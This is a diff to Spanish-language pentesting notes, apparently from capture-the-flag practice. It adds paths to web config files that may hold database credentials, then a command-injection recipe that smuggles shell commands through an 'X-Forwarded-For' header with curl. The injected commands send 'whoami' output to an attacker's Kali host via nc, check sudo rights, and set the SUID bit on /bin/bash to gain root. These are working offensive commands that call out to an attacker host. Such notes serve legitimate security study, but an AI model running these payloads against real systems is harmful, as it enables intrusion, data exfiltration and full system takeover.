@@ -94,10 +94,25 @@ En Windows:  iss apppool\defaultapppool, User, NT Authority\System
 ## Ruta típica en consola
 
 ```python 
+# Archivo de configuracion de la aplicación web y puede contener creds
+- /var/www/html/config.php
 
-/var/www/html/
-	config.php                  # Archivo de configuracion de la aplicación web y puede contener informacion valiosa
-	initialize.php              # Archivo que se crea con las instalación de la web (Similar a wp-config) ya que puede contener credenciales de acceso 'user:passwd' para la DB
+# Archivo que se crea con las instalación de la web (Similar a wp-config) ya que puede contener credenciales de acceso 'user:passwd' para la DB
+- /var/www/html/initialize.php      
+```
+
+## RCE con cabecera: 'X-Forwarded-For'
+
+```bash
+# Este comando de ejecuta dentro de la máquina víctima ya que contiene un archivo llamado 'firewall.php' que contiene la cabecera 'X-Forwarded-For'. Se debe de colocar la cookie en caso de que sea acceso denegado
+❯ curl -s -X GET http://localhost/firewall.php -H "X-FORWARDED-FOR: 1.1.1.1; comando;" -H "Cookie: PHPSESSID=1234"
+
+
+Comandos a ejecutar:
+1. En 'ping -c 1 IP_Kali' usar 'tcpdump -i tun0 icmp -n' para recibirlo en Kali 
+2. En 'whoami | nc IP_Kali 443' usar 'nc -nlvp 443' para recibir el output en Kali 
+3. 'sudo -l'
+4. 'sudo chmod u+s /bin/bash' 
 ```
 
 ## Comandos
